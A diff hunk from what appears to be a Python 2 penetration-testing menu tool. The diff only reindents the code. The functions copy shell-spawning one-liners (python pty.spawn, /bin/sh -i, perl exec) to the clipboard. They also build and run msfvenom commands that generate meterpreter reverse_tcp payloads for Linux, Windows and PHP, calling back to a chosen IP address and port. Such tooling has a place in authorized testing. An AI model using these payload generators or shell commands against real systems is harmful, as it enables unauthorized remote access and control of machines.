@@ -90,55 +90,55 @@ def exit():
 
 # python menu
 def python():
-	os.system('clear')
-	print "Which one do you want to copy to clipboard"
-	print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
-	choice = raw_input(" >>  ")
-	exec_menu(choice)
-	return
+    os.system('clear')
+    print "Which one do you want to copy to clipboard"
+    print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
+    choice = raw_input(" >>  ")
+    exec_menu(choice)
+    return
 
 # python tty
 def python_tty():
-	pyperclip.copy('python -c \'import pty; pty.spawn("/bin/sh")\'')
-	sys.exit
+    pyperclip.copy('python -c \'import pty; pty.spawn("/bin/sh")\'')
+    sys.exit
 
 #bash tty code	
 def bash_tty():
-	pyperclip.copy('echo os.system(\'/bin/bash\')')
-	sys.exit
+    pyperclip.copy('echo os.system(\'/bin/bash\')')
+    sys.exit
 
 #bin code	
 def bin_tty():
-	pyperclip.copy('/bin/sh -i')
-	sys.exit
+    pyperclip.copy('/bin/sh -i')
+    sys.exit
 
 #perl code
 def perl_tty():
-	pyperclip.copy('perl: exec "/bin/sh";')
-	sys.exit
+    pyperclip.copy('perl: exec "/bin/sh";')
+    sys.exit
 
 #MSVENOM Linux
 def linux_msvenom():
-	shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % (IP_ADDR,PORT)
-        msfvenom(shellcode)
+    shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % (IP_ADDR,PORT)
+    msfvenom(shellcode)
 
 #MSVENOM Windows
 def windows_msvenom():
-        shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" %(IP_ADDR,PORT)
-        msfvenom(shellcode)
+    shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" %(IP_ADDR,PORT)
+    msfvenom(shellcode)
 
 #MSVENOM PHP
 def php_msvenom():
-	shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % (IP_ADDR,PORT)
-        msfvenom(shellcode)
+    shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % (IP_ADDR,PORT)
+    msfvenom(shellcode)
 
 def msfvenom(shellcode):
-        warning ="Make sure you are using the correct payload in MSFConsole"
-        os.system('clear')
-        print "Writing Shell"
-        print shellcode
-        os.system(shellcode)
-        print warning
+    warning ="Make sure you are using the correct payload in MSFConsole"
+    os.system('clear')
+    print "Writing Shell"
+    print shellcode
+    os.system(shellcode)
+    print warning
 
 # =======================
 #    MENUS DEFINITIONS
